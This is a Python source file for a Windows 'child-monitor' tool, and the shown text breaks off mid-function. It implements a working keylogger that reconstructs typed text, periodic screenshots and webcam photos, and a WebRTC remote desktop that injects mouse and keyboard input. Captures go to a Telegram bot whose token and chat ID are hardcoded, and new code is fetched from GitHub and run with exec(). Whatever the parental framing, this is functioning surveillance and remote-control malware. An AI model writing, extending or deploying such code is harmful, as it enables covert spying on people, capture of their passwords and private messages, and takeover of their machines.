import asyncio
import ctypes
import ctypes.wintypes as wintypes
import datetime
import http.client
import io
import json
import logging
import os
import socket
import subprocess
import sys
import threading
import time
import urllib.request
import urllib.parse
import uuid
import webbrowser
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from socketserver import ThreadingMixIn

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("MonitorCore")

if getattr(sys, "frozen", False):
    BASE_DIR = Path(sys.executable).resolve().parent
else:
    BASE_DIR = Path(__file__).resolve().parent

CONFIG_FILE = BASE_DIR / "config.json"
STATUS_FILE = BASE_DIR / "last_status.json"
RUNTIME_DIR = BASE_DIR / "runtime"
VIEWER_DIR = BASE_DIR / "web_viewer"

DEFAULTS = {
    "telegram_bot_token": "8769415154:AAHvACXi9Urn1H6pcCCWQwgaTV6QqR8leOc",
    "telegram_chat_id": "-1003819299308",
    "report_interval_seconds": 60,
    "screenshot_interval_seconds": 60,
    "screenshot_enabled": True,
    "keylog_enabled": True,
    "camera_enabled": True,
    "camera_interval_seconds": 300,
    "update_url": "https://raw.githubusercontent.com/kangha23/child-monitor/main/",
    "log_dir": str(BASE_DIR / "logs"),
    "webrtc": {
        "signaling_server": "wss://base-month-compact-compact.trycloudflare.com",
        "viewer_base_url": "https://kruger-diane-levy-appropriations.trycloudflare.com",
        "ice_servers": [
            {"urls": "stun:stun.l.google.com:19302"},
            {"urls": "stun:stun.cloudflare.com:3478"}
        ],
        "target_fps": 60,
        "max_fps": 120,
        "video_codec": "h264"
    }
}

cfg = dict(DEFAULTS)
start_time = None
MACHINE_NAME = os.environ.get("COMPUTERNAME") or socket.gethostname()
paused = threading.Event()
CONTROL_LOCK = threading.Lock()
last_update_id = 0

# ==========================================
# Windows Native Setup & DPI
# ==========================================
user32 = None
kernel32 = None
shcore = None

if sys.platform == "win32":
    user32 = ctypes.WinDLL("user32", use_last_error=True)
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    try:
        shcore = ctypes.WinDLL("shcore", use_last_error=True)
        shcore.SetProcessDpiAwareness(2)
    except Exception:
        try:
            user32.SetProcessDPIAware()
        except Exception:
            pass


# ==========================================
# Multi-Monitor & DPI Metadata Engine
# ==========================================

class RECT(ctypes.Structure):
    _fields_ = [
        ("left", wintypes.LONG),
        ("top", wintypes.LONG),
        ("right", wintypes.LONG),
        ("bottom", wintypes.LONG),
    ]

class MONITORINFOEXW(ctypes.Structure):
    _fields_ = [
        ("cbSize", wintypes.DWORD),
        ("rcMonitor", RECT),
        ("rcWork", RECT),
        ("dwFlags", wintypes.DWORD),
        ("szDevice", wintypes.WCHAR * 32),
    ]


def get_screen_metadata():
    """Lấy thông tin đầy đủ về Virtual Desktop và từng Monitor kèm DPI scale."""
    if sys.platform != "win32" or not user32:
        return {
            "virtual_desktop": {"x": 0, "y": 0, "width": 1920, "height": 1080},
            "monitors": [
                {"id": 0, "name": "Primary Display", "left": 0, "top": 0, "right": 1920, "bottom": 1080, "width": 1920, "height": 1080, "is_primary": True, "dpi": 96, "scale": 1.0}
            ],
            "active_monitor": -1
        }

    vx = user32.GetSystemMetrics(76)
    vy = user32.GetSystemMetrics(77)
    vw = user32.GetSystemMetrics(78)
    vh = user32.GetSystemMetrics(79)

    monitors = []

    def _enum_proc(hMonitor, hdcMonitor, lprcMonitor, dwData):
        info = MONITORINFOEXW()
        info.cbSize = ctypes.sizeof(MONITORINFOEXW)
        if user32.GetMonitorInfoW(hMonitor, ctypes.byref(info)):
            r = info.rcMonitor
            w = r.right - r.left
            h = r.bottom - r.top
            is_pri = bool(info.dwFlags & 1)
            dpi = 96
            scale = 1.0
            if shcore:
                try:
                    dpiX = wintypes.UINT()
                    dpiY = wintypes.UINT()
                    if shcore.GetDpiForMonitor(hMonitor, 0, ctypes.byref(dpiX), ctypes.byref(dpiY)) == 0:
                        dpi = dpiX.value
                        scale = round(dpi / 96.0, 2)
                except Exception:
                    pass

            monitors.append({
                "id": len(monitors),
                "name": str(info.szDevice),
                "left": r.left,
                "top": r.top,
                "right": r.right,
                "bottom": r.bottom,
                "width": w,
                "height": h,
                "is_primary": is_pri,
                "dpi": dpi,
                "scale": scale
            })
        return True

    MONITORENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HMONITOR, wintypes.HDC, ctypes.POINTER(RECT), wintypes.LPARAM)
    user32.EnumDisplayMonitors(0, 0, MONITORENUMPROC(_enum_proc), 0)

    return {
        "virtual_desktop": {"x": vx, "y": vy, "width": vw, "height": vh},
        "monitors": monitors,
        "active_monitor": -1
    }


# ==========================================
# Windows Native Input Simulation
# ==========================================

class KEYBDINPUT(ctypes.Structure):
    _fields_ = [
        ("wVk", wintypes.WORD),
        ("wScan", wintypes.WORD),
        ("dwFlags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_ulonglong if sys.maxsize > 2**32 else ctypes.c_ulong)
    ]

class INPUT(ctypes.Structure):
    class _INPUT(ctypes.Union):
        _fields_ = [("ki", KEYBDINPUT)]
    _anonymous_ = ("_input",)
    _fields_ = [
        ("type", wintypes.DWORD),
        ("_input", _INPUT)
    ]


def map_norm_to_desktop(norm_x, norm_y, monitor_id=-1):
    meta = get_screen_metadata()
    if monitor_id == -1 or monitor_id >= len(meta["monitors"]):
        vd = meta["virtual_desktop"]
        target_x = vd["x"] + int(norm_x * vd["width"])
        target_y = vd["y"] + int(norm_y * vd["height"])
    else:
        mon = meta["monitors"][monitor_id]
        target_x = mon["left"] + int(norm_x * mon["width"])
        target_y = mon["top"] + int(norm_y * mon["height"])
    return target_x, target_y


def sim_mouse_move(norm_x, norm_y, monitor_id=-1):
    if sys.platform == "win32" and user32:
        x, y = map_norm_to_desktop(norm_x, norm_y, monitor_id)
        user32.SetCursorPos(x, y)


def sim_mouse_down(button="left", norm_x=None, norm_y=None, monitor_id=-1):
    if sys.platform == "win32" and user32:
        if norm_x is not None and norm_y is not None:
            sim_mouse_move(norm_x, norm_y, monitor_id)
        flag = 0x0002 if button == "left" else (0x0020 if button == "middle" else 0x0008)
        user32.mouse_event(flag, 0, 0, 0, 0)


def sim_mouse_up(button="left", norm_x=None, norm_y=None, monitor_id=-1):
    if sys.platform == "win32" and user32:
        if norm_x is not None and norm_y is not None:
            sim_mouse_move(norm_x, norm_y, monitor_id)
        flag = 0x0004 if button == "left" else (0x0040 if button == "middle" else 0x0010)
        user32.mouse_event(flag, 0, 0, 0, 0)


def sim_mouse_scroll(delta):
    if sys.platform == "win32" and user32:
        user32.mouse_event(0x0800, 0, 0, int(delta), 0)


def sim_key_press(key_name):
    if sys.platform != "win32" or not user32:
        return
    vk_map = {
        "backspace": 0x08, "tab": 0x09, "enter": 0x0D, "escape": 0x1B,
        "space": 0x20, "left": 0x25, "up": 0x26, "right": 0x27, "down": 0x28,
        "delete": 0x2E, "win": 0x5B
    }
    key_lower = key_name.lower()
    if key_lower in vk_map:
        vk = vk_map[key_lower]
        user32.keybd_event(vk, 0, 0, 0)
        user32.keybd_event(vk, 0, 0x0002, 0)
    elif key_lower == "alttab":
        user32.keybd_event(0x12, 0, 0, 0)
        user32.keybd_event(0x09, 0, 0, 0)
        user32.keybd_event(0x09, 0, 0x0002, 0)
        user32.keybd_event(0x12, 0, 0x0002, 0)
    elif key_lower == "showdesktop":
        user32.keybd_event(0x5B, 0, 0, 0)
        user32.keybd_event(0x44, 0, 0, 0)
        user32.keybd_event(0x44, 0, 0x0002, 0)
        user32.keybd_event(0x5B, 0, 0x0002, 0)


def sim_type_text(text):
    if sys.platform != "win32" or not user32:
        return
    for c in text:
        utf16_code = ord(c)
        inp_down = INPUT()
        inp_down.type = 1
        inp_down.ki.wVk = 0
        inp_down.ki.wScan = utf16_code
        inp_down.ki.dwFlags = 0x0004
        inp_down.ki.time = 0
        inp_down.ki.dwExtraInfo = 0

        inp_up = INPUT()
        inp_up.type = 1
        inp_up.ki.wVk = 0
        inp_up.ki.wScan = utf16_code
        inp_up.ki.dwFlags = 0x0004 | 0x0002
        inp_up.ki.time = 0
        inp_up.ki.dwExtraInfo = 0

        inputs = (INPUT * 2)(inp_down, inp_up)
        user32.SendInput(2, ctypes.byref(inputs), ctypes.sizeof(INPUT))


# ==========================================
# WebRTC / H.264 Remote Desktop Host
# ==========================================

active_remote_room = None
remote_host_task = None
remote_active = False
active_capture_monitor_id = -1


def capture_frame_bgr(monitor_id=-1):
    """Chụp khung hình màn hình (toàn bộ hoặc từng monitor)."""
    try:
        import mss
        with mss.mss() as sct:
            if monitor_id == -1 or monitor_id + 1 >= len(sct.monitors):
                mon = sct.monitors[0]
            else:
                mon = sct.monitors[monitor_id + 1]
            sct_img = sct.grab(mon)
            from PIL import Image
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            return img
    except Exception as e:
        logger.error(f"capture_frame_bgr: {e}")
        return None


try:
    from aiortc import MediaStreamTrack
except ImportError:
    MediaStreamTrack = object

class ScreenVideoStreamTrack(MediaStreamTrack):
    """Video Track cung cấp luồng H.264/VP8 thời gian thực (60 - 120 FPS)."""
    
    kind = "video"
    
    def __init__(self, fps=60):
        super().__init__()
        self.fps = min(max(int(fps), 30), 120)
        self.frame_interval = 1.0 / self.fps

    async def recv(self):
        try:
            import av
            t_start = time.perf_counter()
            img = capture_frame_bgr(active_capture_monitor_id)
            if img is None:
                await asyncio.sleep(self.frame_interval)
                return None
            frame = av.VideoFrame.from_image(img)
            frame.pts = int(time.time() * 1000000)
            frame.time_base = 1 / 1000000
            
            t_elapsed = time.perf_counter() - t_start
            sleep_time = max(0.001, self.frame_interval - t_elapsed)
            await asyncio.sleep(sleep_time)
            return frame
        except Exception:
            await asyncio.sleep(self.frame_interval)
            return None


async def webrtc_host_coroutine(room_id, signaling_url):
    """Xử lý kết nối WebRTC Signaling & P2P DataChannel/Video."""
    global remote_active, active_capture_monitor_id
    try:
        import websockets
    except ImportError:
        logger.error("Vui lòng cài đặt: pip install websockets aiortc av")
        return

    logger.info(f"Đang kết nối Signaling Relay: {signaling_url} (Phòng: {room_id})")

    while remote_active:
        try:
            async with websockets.connect(signaling_url) as ws:
                await ws.send(json.dumps({"type": "join", "role": "host", "room": room_id}))
                logger.info(f"Host đã sẵn sàng trong phòng {room_id}")

                try:
                    from aiortc import RTCPeerConnection, RTCSessionDescription, RTCIceServer, RTCConfiguration
                    use_aiortc = True
                except ImportError:
                    use_aiortc = False
                    logger.warning("aiortc chưa được cài đặt. Đang sử dụng chế độ DataChannel fallback.")

                pc = None
                if use_aiortc:
                    ice_cfgs = cfg.get("webrtc", {}).get("ice_servers", [{"urls": "stun:stun.l.google.com:19302"}])
                    ice_servers = [RTCIceServer(**s) if isinstance(s, dict) else RTCIceServer(s) for s in ice_cfgs]
                    pc = RTCPeerConnection(configuration=RTCConfiguration(iceServers=ice_servers))

                    target_fps = cfg.get("webrtc", {}).get("target_fps", 60)
                    video_track = ScreenVideoStreamTrack(fps=target_fps)
                    pc.addTrack(video_track)

                    @pc.on("datachannel")
                    def on_datachannel(channel):
                        @channel.on("message")
                        def on_message(message):
                            handle_control_message(message, channel)

                async for msg_str in ws:
                    if not remote_active:
                        break
                    data = json.loads(msg_str)
                    mtype = data.get("type")

                    if mtype == "offer" and pc:
                        offer_sdp = data.get("sdp")
                        await pc.setRemoteDescription(RTCSessionDescription(sdp=offer_sdp["sdp"], type=offer_sdp["type"]))
                        answer = await pc.createAnswer()
                        await pc.setLocalDescription(answer)
                        await ws.send(json.dumps({
                            "type": "answer",
                            "room": room_id,
                            "sdp": {"sdp": pc.localDescription.sdp, "type": pc.localDescription.type}
                        }))

                    elif mtype == "candidate" and pc:
                        cand = data.get("candidate")
                        if cand:
                            pass

        except Exception as e:
            logger.error(f"Signaling reconnecting: {e}")
            await asyncio.sleep(3)


def handle_control_message(msg_str, channel=None):
    """Xử lý sự kiện điều khiển chuột, phím, metadata từ DataChannel."""
    global active_capture_monitor_id
    try:
        data = json.loads(msg_str)
        mtype = data.get("type")

        if mtype == "get_metadata":
            meta = get_screen_metadata()
            meta["type"] = "metadata"
            if channel:
                channel.send(json.dumps(meta))

        elif mtype == "switch_monitor":
            active_capture_monitor_id = data.get("monitor_id", -1)
            logger.info(f"Đã chuyển màn hình stream sang: {active_capture_monitor_id}")

        elif mtype == "mousemove":
            sim_mouse_move(data.get("norm_x", 0), data.get("norm_y", 0), data.get("monitor_id", -1))

        elif mtype == "mousedown":
            sim_mouse_down(data.get("button", "left"), data.get("norm_x"), data.get("norm_y"), data.get("monitor_id", -1))

        elif mtype == "mouseup":
            sim_mouse_up(data.get("button", "left"), data.get("norm_x"), data.get("norm_y"), data.get("monitor_id", -1))

        elif mtype == "scroll":
            sim_mouse_scroll(data.get("delta", 0))

        elif mtype == "key":
            sim_key_press(data.get("key", ""))

        elif mtype == "text":
            sim_type_text(data.get("text", ""))

        elif mtype == "ping":
            if channel:
                channel.send(json.dumps({"type": "pong", "t": data.get("t", 0)}))

    except Exception as e:
        logger.error(f"handle_control_message error: {e}")


# ==========================================
# Local HTTP Server phục vụ Web Viewer UI
# ==========================================

class EmbeddedViewerServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


class EmbeddedViewerHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        html_file = VIEWER_DIR / "index.html"
        if html_file.exists():
            content = html_file.read_bytes()
        else:
            content = b"<h1>Web Viewer index.html missing</h1>"

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()
        self.wfile.write(content)


viewer_httpd = None

def start_embedded_viewer_server(port=8088):
    global viewer_httpd
    try:
        viewer_httpd = EmbeddedViewerServer(("0.0.0.0", port), EmbeddedViewerHandler)
        threading.Thread(target=viewer_httpd.serve_forever, daemon=True).start()
    except Exception as e:
        logger.error(f"Embedded viewer server error: {e}")


# ==========================================
# Base Monitoring & Core Helpers
# ==========================================

def now():
    return datetime.datetime.now()


def ts():
    return now().strftime("%Y-%m-%d %H:%M:%S")


def load_config():
    global cfg
    if CONFIG_FILE.exists():
        try:
            data = json.loads(CONFIG_FILE.read_text(encoding="utf-8"))
            cfg.update(data)
        except Exception:
            pass
    Path(cfg["log_dir"]).mkdir(parents=True, exist_ok=True)


def log_line(category, line):
    try:
        day = now().strftime("%Y-%m-%d")
        path = Path(cfg["log_dir"]) / "{}_{}.log".format(category, day)
        with open(path, "a", encoding="utf-8") as f:
            f.write("{} | {} | {}\n".format(ts(), MACHINE_NAME, line))
    except Exception:
        pass


def telegram_enabled():
    token = cfg.get("telegram_bot_token", "")
    chat = cfg.get("telegram_chat_id", "")
    return "PASTE_YOUR" not in token and bool(token) and bool(chat)


class TelegramSender:
    def __init__(self):
        self._conn = None
        self._lock = threading.Lock()

    def send_text(self, token, chat_id, text):
        payload = json.dumps({"chat_id": chat_id, "text": text}).encode("utf-8")
        headers = {
            "Host": "api.telegram.org",
            "Content-Type": "application/json",
            "Connection": "keep-alive"
        }
        with self._lock:
            for attempt in range(2):
                try:
                    if self._conn is None:
                        self._conn = http.client.HTTPSConnection("api.telegram.org", timeout=15)
                    self._conn.request("POST", f"/bot{token}/sendMessage", body=payload, headers=headers)
                    resp = self._conn.getresponse()
                    data = resp.read()
                    res = json.loads(data.decode("utf-8"))
                    return res.get("ok", False)
                except Exception:
                    try:
                        if self._conn:
                            self._conn.close()
                    except Exception:
                        pass
                    self._conn = None
        return False

_tg_sender = TelegramSender()


def send_telegram_text(text):
    if not telegram_enabled():
        return False
    return _tg_sender.send_text(cfg["telegram_bot_token"], cfg["telegram_chat_id"], text)


def send_telegram_photo(path, caption, filename="screen.png", ctype="image/png"):
    if not telegram_enabled() or not path or not Path(path).exists():
        return False
    try:
        with open(path, "rb") as f:
            image = f.read()
        boundary = "----monitor" + uuid.uuid4().hex

        def part(name, value, p_filename=None, p_ctype=None):
            head = f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"'
            if p_filename:
                head += f'; filename="{p_filename}"'
            head += "\r\n"
            if p_ctype:
                head += f"Content-Type: {p_ctype}\r\n"
            return (head + "\r\n").encode("utf-8") + value + b"\r\n"

        body = b""
        body += part("chat_id", str(cfg["telegram_chat_id"]).encode("utf-8"))
        body += part("caption", caption.encode("utf-8"))
        body += part("photo", image, p_filename=filename, p_ctype=ctype)
        body += f"--{boundary}--\r\n".encode("utf-8")

        req = urllib.request.Request(
            f"https://api.telegram.org/bot{cfg['telegram_bot_token']}/sendPhoto",
            data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
        )
        with urllib.request.urlopen(req, timeout=60):
            pass
        return True
    except Exception as e:
        log_line("errors", f"send_photo: {e}")
        return False


def start_webrtc_remote():
    global active_remote_room, remote_active, remote_host_task
    if remote_active and active_remote_room:
        return active_remote_room

    active_remote_room = uuid.uuid4().hex[:8]
    remote_active = True

    webrtc_cfg = cfg.get("webrtc", {})
    signaling_url = webrtc_cfg.get("signaling_server", "ws://127.0.0.1:8765")

    def _run_loop():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(webrtc_host_coroutine(active_remote_room, signaling_url))

    remote_host_thread = threading.Thread(target=_run_loop, daemon=True)
    remote_host_thread.start()
    return active_remote_room


def stop_webrtc_remote():
    global remote_active, active_remote_room
    remote_active = False
    active_remote_room = None
    logger.info("Đã dừng WebRTC Remote Desktop.")


# ==========================================
# Remote Update & Dynamic Runtime Engine
# ==========================================

def update_url():
    return (cfg.get("update_url", "") or "").strip()


def get_current_version():
    marker = RUNTIME_DIR / "current_version.txt"
    if marker.exists():
        return marker.read_text(encoding="utf-8").strip()
    v_file = BASE_DIR / "version.txt"
    if v_file.exists():
        return v_file.read_text(encoding="utf-8").strip()
    return "1.0"


def fetch_remote_update():
    """Kiểm tra và tải code mới từ repository GitHub."""
    base = update_url()
    if not base or "PASTE_YOUR" in base:
        return False
    try:
        # Thêm query param t=... để phá bộ nhớ đệm (cache) của GitHub raw, giúp lệnh /update nhận code tức thì
        version_url = base.rstrip("/") + f"/version.txt?t={int(time.time())}"
        req_v = urllib.request.Request(version_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req_v, timeout=20) as resp:
            remote_version = resp.read().decode("utf-8", "replace").strip()

        cur_v = get_current_version()
        if cur_v == remote_version:
            return False  # Đã ở phiên bản mới nhất

        code_url = base.rstrip("/") + f"/monitor.py?t={int(time.time())}"
        req_c = urllib.request.Request(code_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req_c, timeout=30) as resp:
            code = resp.read().decode("utf-8", "replace")

        if len(code) < 100 or "def " not in code:
            return False

        RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
        (RUNTIME_DIR / "monitor.py").write_text(code, encoding="utf-8")
        (RUNTIME_DIR / "current_version.txt").write_text(remote_version, encoding="utf-8")
        
        # Đồng bộ file version.txt cục bộ
        try:
            (BASE_DIR / "version.txt").write_text(remote_version, encoding="utf-8")
        except Exception:
            pass

        log_line("system", f"remote update to version {remote_version}")
        return True
    except Exception as e:
        log_line("errors", f"remote update: {e}")
        return False


def run_runtime_code():
    """Chạy code động đã tải trong runtime/monitor.py."""
    path = RUNTIME_DIR / "monitor.py"
    if not path.exists():
        return False
    try:
        code = path.read_text(encoding="utf-8")
        ns = {"__name__": "monitor_runtime", "__file__": str(path)}
        exec(compile(code, str(path), "exec"), ns)
        main_fn = ns.get("main")
        if main_fn:
            main_fn()
        return True
    except Exception as e:
        log_line("errors", f"run runtime: {e}")
        return False


def restart_process():
    """Khởi động lại tiến trình để áp dụng bản cập nhật một cách an toàn cho PyInstaller bootloader."""
    release_single_instance()
    try:
        DETACHED_PROCESS = 0x00000008
        if getattr(sys, "frozen", False):
            exe_path = sys.executable
            # Dùng cmd ping để delay 3 giây, cho phép tiến trình cũ đóng hoàn toàn và xóa sạch _MEI, sau đó mới gọi lại file exe
            cmd_str = f'cmd.exe /c ping 127.0.0.1 -n 3 > nul & start "" "{exe_path}"'
            subprocess.Popen(cmd_str, shell=True, creationflags=DETACHED_PROCESS)
        else:
            script_path = str(Path(__file__).resolve())
            subprocess.Popen([sys.executable, script_path], creationflags=DETACHED_PROCESS)
    except Exception as e:
        log_line("errors", f"restart_process: {e}")
    time.sleep(1.0)
    os._exit(0)


def remote_update_cmd():
    """Xử lý lệnh /update."""
    send_telegram_text(f"[{MACHINE_NAME}] 🔄 Đang kiểm tra bản cập nhật từ GitHub...")
    if fetch_remote_update():
        new_v = get_current_version()
        send_telegram_text(f"[{MACHINE_NAME}] ✅ Đã tải thành công phiên bản mới ({new_v}). Đang khởi động lại ứng dụng...")
        time.sleep(2)
        restart_process()
    else:
        cur_v = get_current_version()
        send_telegram_text(f"[{MACHINE_NAME}] ℹ️ Không có bản cập nhật mới (Hiện tại: v{cur_v}).")


# ==========================================
# Window Poller & Keylogger & Reporters
# ==========================================

def active_window_title():
    try:
        if sys.platform != "win32" or not user32:
            return ""
        hwnd = user32.GetForegroundWindow()
        if not hwnd:
            return ""
        length = user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value
    except Exception:
        return ""


window_lock = threading.Lock()
current_window = {"title": "", "start": None}
sessions = []


def window_poller():
    global current_window
    while True:
        try:
            title = active_window_title() or "(desktop)"
            with window_lock:
                if title != current_window["title"]:
                    if current_window["title"] and current_window["start"]:
                        sessions.append({
                            "title": current_window["title"],
                            "start": current_window["start"],
                            "end": now(),
                        })
                    current_window = {"title": title, "start": now()}
        except Exception:
            pass
        time.sleep(3)


key_lock = threading.Lock()
key_buffer = []


def is_shift_down():
    try:
        return bool(user32.GetKeyState(0x10) & 0x8000)
    except Exception:
        return False


def is_caps_down():
    try:
        return bool(user32.GetKeyState(0x14) & 0x0001)
    except Exception:
        return False


def is_ctrl_down():
    try:
        return bool(
            (user32.GetKeyState(0x11) & 0x8000)
            or (user32.GetKeyState(0xA2) & 0x8000)
            or (user32.GetKeyState(0xA3) & 0x8000)
        )
    except Exception:
        return False


def is_upper_letter():
    return is_shift_down() ^ is_caps_down()


def key_to_text(vk, scan):
    if vk == 0x08:
        return "[CTRL+BACKSPACE]" if is_ctrl_down() else "[BACKSPACE]"
    if vk == 0x09:
        return "[TAB]"
    if vk == 0x0D:
        return "[ENTER]\n"
    if vk == 0x1B:
        return "[ESC]"
    if vk == 0x20:
        return " "
    if 0x70 <= vk <= 0x87:
        return f"[F{vk - 0x6F}]"
    if vk == 0x2E:
        return "[DEL]"
    if vk == 0x2D:
        return "[INS]"
    if vk == 0x24:
        return "[HOME]"
    if vk == 0x23:
        return "[END]"
    if vk == 0x21:
        return "[PGUP]"
    if vk == 0x22:
        return "[PGDN]"
    if 0x25 <= vk <= 0x28:
        return f"[{'LURD'[vk - 0x25]}]"
    if vk in (0x10, 0x11, 0x12, 0x14, 0x90, 0x91, 0x2C, 0x13, 0x5B, 0x5C, 0x5D, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5):
        return ""
    if 0x41 <= vk <= 0x5A:
        ch = chr(vk)
        if is_ctrl_down():
            return f"[CTRL+{ch}]"
        return ch if is_upper_letter() else ch.lower()
    if 0x30 <= vk <= 0x39:
        return ")!@#$%^&*("[vk - 0x30] if is_shift_down() else chr(vk)
    if 0x60 <= vk <= 0x69:
        return str(vk - 0x60)
    if vk == 0x6A: return "*"
    if vk == 0x6B: return "+"
    if vk == 0x6D: return "-"
    if vk == 0x6E: return "."
    if vk == 0x6F: return "/"
    if vk == 0xBA: return ":" if is_shift_down() else ";"
    if vk == 0xBB: return "+" if is_shift_down() else "="
    if vk == 0xBC: return "<" if is_shift_down() else ","
    if vk == 0xBD: return "_" if is_shift_down() else "-"
    if vk == 0xBE: return ">" if is_shift_down() else "."
    if vk == 0xBF: return "?" if is_shift_down() else "/"
    if vk == 0xC0: return "~" if is_shift_down() else "`"
    if vk == 0xDB: return "{" if is_shift_down() else "["
    if vk == 0xDC: return "|" if is_shift_down() else "\\"
    if vk == 0xDD: return "}" if is_shift_down() else "]"
    if vk == 0xDE: return '"' if is_shift_down() else "'"
    return ""


def on_key(vk, scan):
    try:
        text = key_to_text(vk, scan)
        if not text:
            return
    except Exception:
        return
    with window_lock:
        win = current_window["title"]
    with key_lock:
        key_buffer.append({
            "time": now().strftime("%H:%M:%S"),
            "win": win,
            "text": text,
        })


def keylog_thread():
    prev = set()
    while True:
        try:
            if paused.is_set():
                prev = set()
                time.sleep(0.5)
                continue
            down = set()
            for vk in range(0x08, 0xFF):
                if user32.GetAsyncKeyState(vk) & 0x8000:
                    down.add(vk)
            newly_pressed = down - prev
            for vk in newly_pressed:
                on_key(vk, 0)
            prev = down
        except Exception:
            pass
        time.sleep(0.02)


def reconstruct_text(key_texts):
    buf = []
    select_all = False
    clipboard = ""

    for text in key_texts:
        if text == "[CTRL+A]":
            select_all = True
            continue
        elif text == "[CTRL+C]":
            clipboard = "".join(buf)
            select_all = False
            continue
        elif text == "[CTRL+V]":
            if select_all:
                buf.clear()
                select_all = False
            buf.extend(list(clipboard))
            continue
        elif text == "[CTRL+X]":
            clipboard = "".join(buf)
            buf.clear()
            select_all = False
            continue
        elif text == "[CTRL+BACKSPACE]":
            if select_all:
                buf.clear()
                select_all = False
            else:
                while buf and buf[-1] == " ":
                    buf.pop()
                while buf and buf[-1] != " ":
                    buf.pop()
            continue

        if select_all:
            if text == "[BACKSPACE]":
                buf.clear()
                select_all = False
                continue
            elif not (text.startswith("[") and text.endswith("]")):
                buf.clear()
                select_all = False

        select_all = False

        if text == "[BACKSPACE]":
            if buf:
                buf.pop()
        elif text == "[TAB]":
            buf.append(" [TAB] ")
        elif text.startswith("[ENTER]"):
            buf.append(" [ENTER] ")
        elif text == " ":
            buf.append(" ")
        elif text.startswith("[CTRL+"):
            buf.append(f" {text} ")
        elif text.startswith("[") and text.endswith("]"):
            buf.append(f" {text} ")
        else:
            buf.append(text)

    result = "".join(buf)
    if len(result) > 400:
        result = result[:400] + "..."
    return result


def reconstruct_by_window(keys):
    if not keys:
        return []
    groups = []
    current_win = None
    current_keys = []
    for k in keys:
        if isinstance(k, dict):
            win = k.get("win", "")
            text = k.get("text", "")
        else:
            parts = str(k).split(" | ", 2)
            win = parts[1] if len(parts) >= 3 else ""
            text = parts[2] if len(parts) >= 3 else str(k)

        if win != current_win:
            if current_keys:
                txt = reconstruct_text(current_keys)
                if txt:
                    groups.append((current_win, txt))
            current_win = win
            current_keys = [text]
        else:
            current_keys.append(text)
    if current_keys:
        txt = reconstruct_text(current_keys)
        if txt:
            groups.append((current_win, txt))
    return groups


def take_screenshot():
    try:
        import mss
        shots = Path(cfg["log_dir"]) / "screenshots"
        shots.mkdir(parents=True, exist_ok=True)
        path = shots / (now().strftime("%Y-%m-%d_%H-%M-%S") + ".png")
        with mss.mss() as sct:
            sct.shot(output=str(path))
        return str(path)
    except Exception:
        return None


def capture_camera():
    try:
        import cv2
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        cap.release()
        if not ret or frame is None:
            return None
        shots = Path(cfg["log_dir"]) / "camera"
        shots.mkdir(parents=True, exist_ok=True)
        path = shots / (now().strftime("%Y-%m-%d_%H-%M-%S") + ".jpg")
        cv2.imwrite(str(path), frame)
        return str(path)
    except Exception:
        return None


def do_camera_shot():
    p = capture_camera()
    if p:
        send_telegram_photo(
            p,
            f"📷 Camera {MACHINE_NAME} {now().strftime('%H:%M')}",
            filename="camera.jpg",
            ctype="image/jpeg",
        )
    else:
        send_telegram_text(f"[{MACHINE_NAME}] ❌ Không chụp được camera (Webcam chưa kết nối hoặc đang bận).")


def do_screen_shot():
    p = take_screenshot()
    if p:
        send_telegram_photo(
            p,
            f"🖥️ Screenshot {MACHINE_NAME} {now().strftime('%H:%M')}",
            filename="screen.png",
            ctype="image/png",
        )
    else:
        send_telegram_text(f"[{MACHINE_NAME}] ❌ Không chụp được ảnh màn hình.")


def screenshot_thread():
    while True:
        time.sleep(cfg.get("screenshot_interval_seconds", 60))
        if paused.is_set():
            continue
        if not cfg.get("screenshot_enabled", True):
            continue
        p = take_screenshot()
        if p:
            log_line("system", f"screenshot {p}")


def camera_thread():
    while True:
        interval = cfg.get("camera_interval_seconds", 0)
        if interval <= 0:
            time.sleep(30)
            continue
        time.sleep(interval)
        if paused.is_set():
            continue
        if not cfg.get("camera_enabled", False):
            continue
        p = capture_camera()
        if p:
            log_line("system", f"camera {p}")
            send_telegram_photo(
                p,
                f"📷 Camera {MACHINE_NAME} {now().strftime('%H:%M')}",
                filename="camera.jpg",
                ctype="image/jpeg",
            )


def drain_keys():
    with key_lock:
        items = list(key_buffer)
        key_buffer.clear()
    return items


def drain_sessions(since):
    with window_lock:
        picked = [s for s in sessions if s["start"] >= since]
        sessions[:] = [s for s in sessions if s["start"] < since]
    return picked


def latest_screenshot():
    shots = Path(cfg["log_dir"]) / "screenshots"
    if not shots.exists():
        return None
    files = sorted(shots.glob("*.png"), key=lambda p: p.stat().st_mtime)
    return str(files[-1]) if files else None


def force_report():
    try:
        since = now() - datetime.timedelta(minutes=15)
        keys = drain_keys()
        sess = drain_sessions(since)
        lines = []
        if sess:
            lines.append("📱 **Ứng dụng:**")
            for s in sess[:30]:
                secs = int((s["end"] - s["start"]).total_seconds())
                lines.append(f"  • {s['title']} ({secs // 60}m) lúc {s['start'].strftime('%H:%M')}")
        if keys:
            lines.append("⌨️ **Phím bấm:**")
            groups = reconstruct_by_window(keys)
